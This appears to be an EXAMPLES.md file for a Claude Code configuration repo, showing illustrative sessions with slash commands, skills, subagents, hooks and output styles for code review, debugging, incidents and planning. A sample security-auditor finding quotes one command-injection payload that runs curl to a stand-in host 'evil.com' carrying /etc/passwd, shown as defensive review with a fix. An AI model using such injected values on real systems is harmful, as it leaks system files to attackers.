# Examples — what it looks like when you actually use this stuff

Concrete before/after for each major skill, agent, hook, and style. Read `CONCEPTS.md` first if "skill vs. agent" is still fuzzy.

Responses below are illustrative — actual Claude output will vary in wording. The *shape* is what matters.

---

## Commands

### `/tldr` — 3-bullet summary of anything

**You:** `/tldr src/auth/session.ts`

**You get:**
```
- Manages server-side session state (creation, refresh, destruction) for the
  JWT-based auth flow.
- Key exports: createSession, refreshSession, destroySession — all take a
  Request and return a Promise<Session>.
- Gotcha: destroySession requires the session lock to be held by the caller
  (see #412 — fixed a race there).
```

**You:** `/tldr HEAD~5`

**You get:** a 3-bullet summary of the diff over the last 5 commits.

### `/blame-why` — why does this line exist?

**You:** `/blame-why src/billing/invoice.ts:142`

**You get:**
```
## Line
src/billing/invoice.ts:142 — `if (invoice.amount === 0) return;`

## Last changed
a4f2c81 by @priya on 2024-11-02

## Why
Short-circuit added to avoid generating zero-amount invoice PDFs.
Commit message: "don't bill $0 invoices". Related code in the same commit
suggests this was caused by trial accounts triggering the billing job.

## Related context
The commit also updated test/billing/zero-amount.test.ts — worth reading
if you plan to change this branch.
```

### `/5-whys` — root-cause analysis

**You:** `/5-whys the deploy pipeline took 40 min today when it usually takes 8`

**You get:**
```
## Problem
Deploy pipeline took 40 min; typical is 8 min.

## Analysis
1. **Why?** The "build-frontend" step took 32 min instead of its usual 2 min.
   → because it reinstalled all npm deps from scratch.
2. **Why?** → because the CI cache was missing.
3. **Why?** → because the cache key changed when someone updated the Node version.
4. **Why?** → because our cache key includes the Node version but we didn't
   pre-warm the new cache.
5. **Why?** → because we don't have a process for "warming" CI caches when
   dependencies or runtime versions change.

## Likely root cause
Missing a "cache warm-up" step after infrastructure-like changes (Node version,
package manager, base image). Systemic, not a one-off.

## One action that would address it
Add a GitHub Actions workflow that runs on changes to package.json,
.nvmrc, or Dockerfile, populates the main-branch cache, and blocks
merging until it's warm.
```

### `/tradeoff` — structured comparison

**You:** `/tradeoff Postgres vs DynamoDB for the new reports service`

**You get:** a 4–6-axis matrix comparing both options, a recommendation paragraph, and an explicit statement of what tradeoff the recommendation accepts. See [EXAMPLES.md#agents → architect](EXAMPLES.md) for a related longer version.

### `/what-changed` — summarize since a ref

**You:** `/what-changed v2.1`

**You get:** grouped release-notes-style summary (new / improved / fixed / refactored), with breaking changes called out at the top.

### `/rubber-duck` — help me think

**You:** `/rubber-duck — I'm stuck on whether to split this service or keep it monolithic`

**Claude:**
```
Let me reflect that back: you're deciding whether to split an existing service
into smaller pieces or leave it as-is.

What's driving you to consider splitting now? Something specific hit a wall,
or is this a "feels like it might be time" thing?
```

(One question at a time. Claude won't solve — it'll ask, reflect, and let you arrive at the answer.)

---

## Skills

### `/code-review` — Review pending changes

**You:**
```
/code-review
```

**Claude (reads the skill, gathers diff):**
```
Looking at your staged changes against main:
- 3 files changed: src/auth/session.ts, src/auth/logout.ts, test/logout.test.ts
- 1 commit on this branch: "Fix logout race"

Reading each file in full...
```

**You get:**
```markdown
## Summary
Fixes a real race between logout and the token refresh job. The fix is correct
and covered by a test. One blocker: the lock isn't released if clearCookies()
throws. Request changes.

## Blockers
- **src/auth/logout.ts:42** — sessionLock is taken but not released on exception:
  ```ts
  const lock = await sessionLock.acquire(userId);
  clearCookies(res);        // if this throws, lock never released
  await session.destroy();
  lock.release();
  ```
  Fix: wrap in try/finally.

## Suggestions
- test/logout.test.ts:28 — asserts `status === 200` but doesn't verify the session
  is actually gone. Consider asserting the cookie is cleared in the response.

## Nits
- (nit) src/auth/logout.ts:19 — variable `s` is one char; `session` would read better.

## What's good
- Reproducing the race in the test before fixing it — exactly right approach.
```

### `/commit` — Smart commit

**You:**
```
/commit
```

**Claude:**
```
Checking state...
  Staged: (nothing)
  Modified: src/auth/logout.ts, test/logout.test.ts

Both changes are related to the logout race fix. Stage both as one commit?
```

**You:** `yes`

**Claude** (stages explicitly, screens for secrets, writes message):
```
Committed 2 files as:

  Fix logout race when session is expiring

  The logout handler was racing with the token refresh job...
  [body omitted]

  Fixes #412

Working tree is clean.
```

### `/pr-description` — Draft PR body

**You:** `/pr-description`

**You get:**
```
Fix logout race with refresh job

## Summary
Logout was racing with the token-refresh job: if a user hit logout within the
10s refresh window, the refresh would re-create the session cookie after logout
cleared it. Takes the session lock before clearing cookies.

## Changes
- Acquire sessionLock before clearing cookies in logout handler
- Added a test that reproduces the race by triggering refresh and logout concurrently
- Release lock in finally block to cover exception paths

## Test plan
- [ ] `npm test -- test/logout.test.ts` passes
- [ ] Manual: log in, trigger a refresh in devtools, click logout → user stays logged out

## Notes for reviewer
The finally-release is my fix for the first review round; see discussion in comments.

Fixes #412
```

### `/debug-help` — Systematic debugging

**You:** `/debug-help — my checkout request returns 500 but only in prod, started yesterday`

**Claude:**
```
Quick framing — want to make sure I have it:

- Symptom: POST /api/checkout → 500, prod only
- Started: yesterday
- Still happening? Deterministic?
```

**You:** `yes still happening, about 30% of requests`

**Claude:**
```
OK. Two cheapest hypotheses to test:

1. Deploy yesterday introduced it → `git log --since="2 days ago" --first-parent main --oneline`
2. Data-shape issue in prod that doesn't hit in dev → need one failing request's payload

I'll start with (1). If nothing suspicious, we'll want a failing payload.
```

**Claude runs git log, finds a suspect commit, investigates, identifies root cause, proposes fix, writes test that reproduces the bug before fixing it.**

### `/user-story` — Turn feature idea into a story

**You:** `/user-story — let people export their reports as CSV`

**Claude:**
```
Quick clarifications:
- Which users? Free-tier, paid, or admin-only?
- Any format preferences beyond CSV (JSON, Excel)?
- Async (email the file) or sync (download in browser)?
```

**You:** `paid users only, CSV only, sync download, reasonable row cap`

**You get:**
```
## Story
As a paid user, I want to export my reports as CSV from the report view,
so that I can analyze them in my own tools.

## Acceptance criteria
- Given I'm on a report page as a paid user, when I click "Export CSV",
  then my browser downloads the file within 5s for reports up to 10k rows.
- Given a report has more than 10k rows, when I click "Export CSV",
  then I see an inline message: "Reports over 10k rows: use the Reports API instead."
- Given I'm on a free plan, when I view the report, then the "Export CSV" button is not shown.
- Given the export request fails, when the response comes back, then I see an
  inline error with retry, and no partial file downloads.

## Out of scope
- JSON or Excel formats
- Async/email delivery
- Scheduled exports

## Open questions
- Should the CSV include all fields, or only the ones currently visible in the report view?
- What encoding? UTF-8 with BOM for Excel compatibility?

## Size
M — one screen, one endpoint, one new feature-flag gate.
```

### `/standup` — Standup notes from git activity

**You:** `/standup` (on a Tuesday)

**Claude:**
```
Pulling your activity since yesterday...

Found 4 commits on feature/checkout-csv and 2 PR reviews. Anything non-code
— meetings, pairing, investigations — I should include?
```

**You:** `spent an hour debugging the staging deploy with sam`

**You get:**
```
**Yesterday**
- Landed the CSV-export endpoint behind a feature flag (#428)
- Reviewed 2 PRs (checkout bug fix, billing copy)
- Paired with Sam debugging the staging deploy — was a stale secret in the vault

**Today**
- Wire the Export button into the report UI
- Tests for the 10k-row cap case

**Blockers**
- None
```

### `/retro` — Facilitate a retrospective

**You:** `/retro — last two weeks`

**Claude pulls git/PR activity, then:**
```
Summary: 47 commits, 12 PRs merged, 8 issues closed. Notable: the payment
incident on Oct 14 and the CSV-export launch.

Format: "went well / didn't / change"? Or another?
```

**You:** `that's fine`

**Claude steps through the prompts one at a time, gathers inputs, then:**
```
# Retro — Oct 1–14

## Context
- 47 commits, 12 PRs, 8 issues
- 1 incident (payment provider outage, ~15 min customer impact)
- Shipped CSV export

## What went well
- Rollback on the payment incident took 4 min
- CSV export hit its release date despite scope creep
- More async review via Slack — fewer review-bottlenecks

## What didn't
- The payment incident runbook was outdated (took 3 min to realize)
- CSV export had 3 "one more thing" additions mid-sprint — scope crept from S to M

## Themes
- **Runbook staleness** — we haven't touched /docs/runbooks since June
- **Scope discipline** — mid-sprint additions cost us focus twice in two weeks

## Action items
1. **Audit and update top 5 runbooks.** Owner: Priya. By Oct 28. Success: each
   has a verified "last checked" date within 2 weeks of the audit.
2. **Add "new scope?" as a standing question in sprint-midpoint check-in.**
   Owner: EM. Starting next sprint.
3. **Document the CSV-export decisions in an ADR** (format, row cap, tier gating).
   Owner: @you. By end of week.
```

### `/incident` — Live incident flow

**You:** `/incident — checkout is down, 50% error rate, started 5 min ago`

**Claude (tight mode):**
```
Getting oriented:
- Symptom: /checkout 500s at 50%
- Started: ~5 min ago

Recent deploys in the last hour?
```

**You:** `yeah, #4218 went out 10 min ago`

**Claude:**
```
Strong candidate. Before we investigate — can you rollback #4218 in under 5 min?
If yes, do it first. Debug after.
```

**You:** `rolling back`

**Claude:**
```
Timeline
14:03 UTC  Symptom: /checkout 500s at ~50%
14:05 UTC  Identified deploy #4218 landed 14:00 as likely cause
14:08 UTC  Rollback started

Status: mitigating
Next: paste metrics when rollback completes — we need to confirm error rate drops.
```

**After the fire's out, Claude offers to draft a postmortem timeline from the captured events.**

### `/adr` — Architecture Decision Record

**You:** `/adr — we're picking Postgres over DynamoDB for the new reports service`

**Claude asks a few framing questions, then writes to `docs/adr/0008-reports-service-database.md`:**

```markdown
# 0008. Use Postgres for reports service

- **Status:** Accepted
- **Date:** 2025-10-15
- **Deciders:** @utsab, @priya, @sam

## Context
The reports service needs to persist ~2M rows/month of aggregated analytics
data, support ad-hoc queries by the internal team, and integrate with the
existing BI pipeline (which reads from Postgres).

## Decision
We will use Postgres for the reports service's primary data store.

## Options considered
### Option A — Postgres
- **How it works:** Shared cluster with the main app...
- **Pros:** ...
- **Cons:** ...

### Option B — DynamoDB
- **How it works:** ...
- **Pros:** ...
- **Cons:** ...

## Rationale
Postgres wins on two fronts: BI pipeline integration and ad-hoc query flexibility.
DynamoDB would force us to build a secondary analytics pipeline for BI, which
would cost more than the storage savings.

## Consequences
- Positive: BI integration is automatic, team knows Postgres well
- Negative: we take on the "shared cluster" risk; need to isolate the reports
  workload with connection limits.
- Neutral: we'll need to add a reports-service Postgres role and migration tool.

## Follow-ups
- #441 — Provision reports-service Postgres role
- #442 — Add report tables to BI extract pipeline
```

### `/onboard` — Get oriented in a new codebase

**You:** `/onboard` (on a repo you just cloned)

**Claude:**
```
Before I start — how familiar are you with Node/TypeScript, and what's your
first goal here (fix a bug, add a feature, just understand it)?
```

**You:** `node/TS comfortable, goal is to add a new API endpoint`

**Claude delivers a tailored tour:**

```
# Onboarding: this-repo

## What this is
Multi-tenant SaaS API for resource allocation. Serves a React frontend (separate repo).

## Entry points for your goal (new endpoint)
- Routes are wired in `src/api/router.ts:23` — pattern: `router.post('/foo', handler)`
- Handlers live in `src/api/handlers/` — thin, they delegate to services
- Business logic: `src/services/` — this is where the real work is
- Tests: mirror structure under `test/api/` and `test/services/`

## One walked path
A POST /api/resources flow:
- router.ts:42 — route matched
- handlers/resources.ts:17 — validates input via zod schema, calls `ResourceService.create`
- services/resource.ts:88 — business logic; enforces tenant quota
- db/resources.ts:134 — Postgres insert
- jobs/resource-events.ts:22 — enqueues a webhook event

Your new endpoint will follow this shape.

## Core domain
- **Tenant** — a paying customer. Everything is scoped to a tenant.
- **Resource** — the thing the API manages.
- **User** — humans authorized within a tenant.
- **Quota** — per-tenant limits enforced in services/

## Landmines
- `TEST_DATABASE_URL` must be set for tests — the README doesn't mention this
- The `jobs/` folder uses an in-repo queue, not Sidekiq-like. See jobs/README.md
- Don't upgrade `pg` past v8.11 — breaks on Node 18 (comment in package.json)

## First task
For "add a new endpoint" — start at `src/api/router.ts:23` to see the registration
pattern, then copy `src/api/handlers/resources.ts` as your template.
```

---

## Agents

### `code-reviewer` — independent second opinion

**You (in the middle of a session):** `Let's double-check this diff with the code-reviewer agent — I want a fresh look.`

**Claude spawns the agent. The agent has no memory of your conversation — just the diff.**

**The agent returns a summary to Claude:**
```
Two blockers: (1) the session lock isn't released on exception in logout.ts:42
— same thing the user already fixed, but I'd double-check the try/finally order;
(2) test/logout.test.ts:28 only asserts status code — the race could re-enter
between status and cookie-clearing and the test wouldn't catch it.
Suggest asserting cookie is cleared in the response headers.
```

**Claude surfaces this to you.** Because the agent had no context, it didn't anchor on "we already handled that" — and caught something you'd missed.

### `security-auditor` — before shipping risky code

**You:** `This PR adds user-controlled input to a shell command. Run the security-auditor on it.`

**Claude spawns the agent, which does a focused review and returns:**

```
## Summary
HIGH severity: command injection reachable from unauthenticated endpoint.
Don't ship.

## High-severity findings
- **Command injection in src/reports/export.ts:34**
  ```ts
  exec(`csv-tool --format ${req.query.format} ${path}`)
  ```
  Issue: `req.query.format` is concatenated into a shell command. Attacker can
  pass `format=csv;curl evil.com/$(cat /etc/passwd)` to exfiltrate.
  Reachability: /api/export is auth-protected? Check auth middleware — I couldn't
  confirm from this diff alone.
  Fix: use `execFile('csv-tool', ['--format', format, path])` so args aren't
  shell-parsed. Additionally, allowlist `format` to {csv, json, tsv}.
```

### `architect` — plan before you code

**You:** `/architect — we need to add real-time updates to the reports view`

**Claude delegates to the agent. The agent reads the codebase, then returns:**

```
## Goal
Real-time updates on the reports view. Out of scope: multi-user collaboration,
offline sync.

## Approach options
### Option A — Polling every 5s
- How: frontend polls GET /api/reports/:id every 5s
- Cost: low implementation effort, extra API traffic
- Buys: dead simple, reuses existing endpoint, cacheable
- Reversibility: trivial

### Option B — Server-Sent Events (SSE)
- How: new GET /api/reports/:id/stream endpoint returns an SSE stream
- Cost: moderate, new infra (long-lived connections)
- Buys: near-instant updates, lower server load than polling at scale
- Reversibility: easy — can disable via flag

### Option C — WebSockets
- How: add a websocket server, push on changes
- Cost: significant infra — we have no websocket infra today
- Buys: bi-directional, which we don't need
- Reversibility: high cost to add, high cost to remove

## Recommendation
Option B (SSE). We don't have the scale that justifies WebSocket infra, and
polling is wasteful at even moderate concurrent users. SSE is the right tool.

## Plan
1. Add /api/reports/:id/stream SSE endpoint (~4h, low risk)
2. Emit events from the existing reports service's update path (~2h)
3. Frontend: useEventSource hook on the report view (~3h)
4. Feature flag: `reports.realtime` (~1h)
5. Ship to internal tenant, verify, then broader rollout

## Cross-cutting
- Observability: add metrics for active SSE connections
- Rollback: feature flag controls client; server endpoint can stay
- Tests: integration test for SSE requires a test harness — ~2h additional
```

### `incident-commander` — live incident driver

**You:** `incident-commander — checkout is returning 500s, 30% error rate`

**The agent runs in tight mode, keeps a timeline, pushes for mitigation, verifies stability, and prompts you for stakeholder comms at the right moments. Example exchange:**

```
Agent: Checkout 500s at 30% — got it. What changed in the last 2 hours?

You: deploy #4218 landed 10 min ago

Agent: Strong suspect. Rollback in <5 min possible?

You: yes

Agent: Do it. Investigation waits.

Timeline
14:03 UTC  Checkout 500s at ~30%
14:06 UTC  Suspect deploy #4218
14:08 UTC  Rollback initiated

Status: mitigating
Next: confirm error rate drops after rollback.
```

### `performance-analyst` — measure before optimize

**You:** `checkout is slow, run the performance-analyst`

**The agent refuses to speculate without data:**

```
Before I recommend anything — what's the actual timing? Do you have:
- An APM trace of a slow request?
- Timing logs showing where the time goes?
- At minimum, total response time at p50 and p95?

Without measurement, any recommendation is a guess. If you don't have this data,
I can help you add lightweight timing to get a baseline — takes ~10 min — then
we optimize the actual bottleneck.
```

You provide a trace showing the DB query taking 6.2s of 8s total. The agent
returns a ranked plan with an indexed migration as the first, lowest-risk fix.

---

## Hooks

### `format-on-edit.sh`

**What you see:** nothing new, visually. But every time Claude edits a `.ts` file, prettier runs automatically. The diff you review is already formatted.

Without the hook:
```
Claude edits src/foo.ts — inconsistent indentation, missing semicolons
You run prettier manually (or CI complains later)
```

With the hook:
```
Claude edits src/foo.ts
format-on-edit.sh runs prettier silently
You see clean, formatted code
```

### `block-env-writes.sh`

**What happens if Claude tries to edit `.env`:**

```
Claude (attempted): Edit .env to add API_KEY=...
Hook (blocked): "Blocked: refuses to modify env file (.env).
                 If you really want to, edit it yourself."
Claude: I can't edit .env. Would you like me to instead add
        it to .env.example with a placeholder?
```

### `notify-on-idle.sh`

**What happens when Claude needs your approval:**

You tabbed away to read Slack. Claude hits a permission prompt for a command it can't auto-run. The hook fires → macOS notification pops up: "Claude Code — Needs your approval for: `gh pr create...`" → you tab back and approve.

Without the hook, you'd have to keep checking. With it, you just get interrupted when it matters.

---

## Output styles

### `terse`

**Without:**
> You: What does this function return when given an empty array?
> Claude: Great question! Let me take a look at the function... *[reads file]* ... Looking at this function, I can see that when given an empty array as input, it will...

**With `terse`:**
> You: What does this function return when given an empty array?
> Claude: `null`.

### `senior-reviewer`

**Without:**
> You: I'm going to cache the user permissions in Redis with a 5 min TTL.
> Claude: Sounds like a reasonable approach! Let me implement that for you...

**With `senior-reviewer`:**
> You: I'm going to cache the user permissions in Redis with a 5 min TTL.
> Claude: Before we do — two concerns:
> 1. How do permission changes propagate? With 5-min TTL, a revoked user can
>    still act for up to 5 minutes. Acceptable for this use case?
> 2. Cache-miss stampede — if the cache expires during high traffic, every
>    request hits the DB. Is that OK, or do we want a stale-while-revalidate pattern?
>
> If these are both fine, I'll proceed.

### `teacher`

**Without:**
> You: Why does this use a WeakMap here?
> Claude: It's used to store metadata associated with DOM nodes without preventing garbage collection.

**With `teacher`:**
> You: Why does this use a WeakMap here?
> Claude: Before I answer specifically — how familiar are you with JS garbage collection? I can calibrate.
> You: I know the basics.
> Claude: OK. `WeakMap` differs from `Map` in one crucial way: its keys are *weakly* referenced. If nothing else in the program holds a reference to the key, the entry gets garbage-collected automatically. You use it when you want to attach metadata to an object *without* keeping the object alive just because of the metadata.
>
> In this code, the key is a DOM node. If the node is removed from the DOM and no other reference exists, `WeakMap` lets the node (and its metadata entry) be collected. A `Map` would leak memory — the Map itself would keep the node alive forever.
>
> Rule of thumb: use `WeakMap` for "metadata attached to an object whose lifetime you don't control."

---

## Combining features

A realistic day using this repo:

1. Start Claude Code in your project.
2. `/config` → output style → `terse`. Now Claude is concise by default.
3. `/what-changed main` — quick summary of everything on your branch before you dive back in.
4. You edit some code; Claude helps — hook `format-on-edit.sh` keeps it tidy.
5. `/tldr src/new-file.ts` — quickly sanity-check the new module you just wrote.
6. `/code-review` — Claude reviews your pending changes.
7. Claude delegates parts of the review to the `security-auditor` agent (fresh context, catches things you missed).
8. `/commit` — commit message written honestly, no secrets staged.
9. `/pr-description` — draft body for the PR.
10. Open the PR yourself.
11. Later, a colleague runs `/code-review` on your PR from their side, independently.
12. `/standup` in the morning to draft tomorrow's update.

Commands, skills, agents, hooks, and output styles — all composing into one flow. This is what "productive with Claude Code" looks like.
